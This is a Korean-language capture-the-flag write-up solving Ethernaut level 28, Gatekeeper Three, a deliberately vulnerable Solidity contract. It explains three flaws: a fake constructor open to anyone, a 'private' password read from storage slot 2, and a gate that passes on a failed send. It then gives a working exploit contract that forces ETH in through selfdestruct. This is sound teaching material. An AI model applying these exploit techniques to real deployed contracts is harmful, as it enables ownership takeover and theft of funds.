---
title: "Ethernaut 28 Gatekeeper Three"
published: 2026-05-07
description: "Ethernaut 28 Gatekeeper Three 문제 풀이."
category: "CTF/Wargame"
tags: ["Web3", "Ethernaut", "Writeup"]
listed: false
---

## 문제
### 지문
Cope with gates and become an entrant.
Things that might help:
Recall return values of low-level functions.
Be attentive with semantic.
Refresh how storage works in Ethereum.
### 코드
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```
## 배경지식

---

Solidity 0.4.22 이전에는 컨트랙트 이름과 같은 함수를 생성자로 쓰는 방식이 있었다. 지금은 `constructor` 키워드를 쓰기 때문에 `construct0r`는 생성자가 아니라 그냥 public 함수다.
배포 시 자동 실행되는 초기화 코드가 아니고, 아무나 호출할 수 있는 일반 함수라고 보면 된다. 이 차이 때문에 `owner`를 나중에 덮어쓸 수 있다.

---

`private`은 Solidity 레벨에서 다른 컨트랙트가 직접 접근하지 못하게 할 뿐, 체인에 저장된 값을 숨기지는 않는다. 컨트랙트의 storage는 슬롯 단위로 공개되어 있고 `eth_getStorageAt` 같은 RPC로 읽을 수 있다.
`SimpleTrick`의 상태 변수는 순서대로 저장된다.
1. `target`: slot 0
2. `trick`: slot 1
3. `password`: slot 2

`createTrick()`으로 `SimpleTrick`을 만든 뒤 `trick` 주소를 얻고, 그 컨트랙트의 slot 2를 읽으면 `password`를 알 수 있다.

---

`send`는 ETH 전송에 실패해도 전체 트랜잭션을 revert하지 않고 `false`를 반환한다. `gateThree`는 이 실패를 오히려 통과 조건으로 사용한다.
공격 컨트랙트를 `owner`로 만든 뒤, 공격 컨트랙트가 ETH를 받을 수 없게 `receive`나 payable fallback을 두지 않으면 `payable(owner).send(0.001 ether)`가 실패한다.

---

컨트랙트에 `receive()`가 없어도 ETH를 강제로 보낼 수 있는 방법이 있다. 여기서는 별도 컨트랙트를 만들고 생성자에서 `selfdestruct`를 호출해 `GatekeeperThree`로 잔액을 보내면 된다.
Cancun 이후에도 생성 중인 컨트랙트가 같은 트랜잭션 안에서 `selfdestruct`되는 경우에는 잔액 전송이 가능하다. 이 문제에서는 `address(this).balance > 0.001 ether` 조건만 만족하면 된다.
## 문제 코드 분석

---

먼저 `construct0r`와 `gateOne`을 보자.
```solidity
function construct0r() public {
    owner = msg.sender;
}

modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```
`construct0r`는 `constructor`가 아니다. 이름에 알파벳 `o` 대신 숫자 `0`이 들어가 있어서 누구나 호출 가능한 public 함수다.
`gateOne`은 `msg.sender == owner`이면서 `tx.origin != owner`이어야 한다. EOA가 직접 `enter()`를 호출하면 `msg.sender`와 `tx.origin`이 같아서 통과할 수 없다. 따라서 공격 컨트랙트를 `owner`로 만든 뒤, EOA가 공격 컨트랙트를 통해 `enter()`를 호출해야 한다.

---

이제 `createTrick`과 `password`를 보자.
```solidity
function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
}

function getAllowance(uint256 _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
}
```
`gateTwo`는 `allowEntrance == true`를 요구하고, 이 값은 `getAllowance()`에서만 바뀐다. 문제는 `getAllowance()`가 `SimpleTrick.checkPassword()`를 통과해야 한다는 점이다.
`password`는 `private`이지만 storage slot 2에 그대로 저장된다. 실제로 `trick` 주소를 얻고 slot을 읽어보면 다음과 같다.
```javascript
await contract.createTrick()
await contract.trick()
'0xd21E19b406fc956392AcF8415D41fbAE6655bD6a'

await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 0)
'0x00000000000000000000000071bcb6eaa9db7fffde06e152454fd954eff79b00'
await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 1)
'0x000000000000000000000000d21e19b406fc956392acf8415d41fbae6655bd6a'
await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 2)
'0x00000000000000000000000000000000000000000000000000000000692e9ca4'
```
slot 0과 slot 1은 주소값이고, slot 2의 `0x692e9ca4`가 `password`다. 이 값을 `uint256`으로 넘기면 `allowEntrance`가 `true`가 된다.

---

마지막으로 `gateThree`의 실패 조건을 보자.
```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```
여기서는 조건을 만족하지 못하면 revert가 아니라 함수 본문이 실행되지 않는 구조다. 따라서 `entrant`를 바꾸려면 두 조건을 모두 만족해야 한다.
첫 번째 조건은 `GatekeeperThree`에 `0.001 ether`보다 많은 ETH를 넣으면 된다. 일반 전송도 가능하지만, 문제 힌트와 맞게 `selfdestruct`로 강제 전송할 수 있다.
두 번째 조건은 `owner`에게 `0.001 ether`를 보내는 `send`가 `false`를 반환해야 한다. `owner`를 공격 컨트랙트로 만들고, 공격 컨트랙트에 ETH 수신 함수를 두지 않으면 이 전송이 실패한다.
## 풀이
통과해야 할 조건은 세 개다.
1. `owner`는 공격 컨트랙트이고, `enter()` 호출은 공격 컨트랙트를 거쳐야 한다.
2. `SimpleTrick`의 slot 2에서 `password`를 읽어 `getAllowance(password)`를 호출해야 한다.
3. `GatekeeperThree`에는 `0.001 ether`보다 많은 ETH가 있어야 하고, `owner`로의 `send`는 실패해야 한다.

흐름은 단순하다. 먼저 `createTrick()`을 호출해 `SimpleTrick`을 만들고, `trick()`으로 주소를 확인한 뒤 slot 2를 읽는다. 그 다음 공격 컨트랙트에서 `construct0r()`, `getAllowance(password)`, `enter()`를 순서대로 호출한다.
`createTrick()`을 공격 함수 안에 같이 넣지 않은 이유는 중간에 storage를 읽어 `password`를 알아내야 하기 때문이다.
### 익스플로잇
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function getAllowance(uint256 _password) external;
    function createTrick() external;
    function enter() external;
    function construct0r() external;
}

contract Selfdestruct {
    constructor(address _addr) payable {
        selfdestruct(payable(_addr));
    }
}

contract Attack {
    IGatekeeperThree gatekeeperthree;

    constructor(address _addr) {
        gatekeeperthree = IGatekeeperThree(_addr);
    }

    function forceFund() external payable {
        new Selfdestruct{value: msg.value}(address(gatekeeperthree));
    }

    function attack(uint256 _password) public {
        gatekeeperthree.construct0r();
        gatekeeperthree.getAllowance(_password);
        gatekeeperthree.enter();
    }
}
```
![screenshot](./image-1.png)
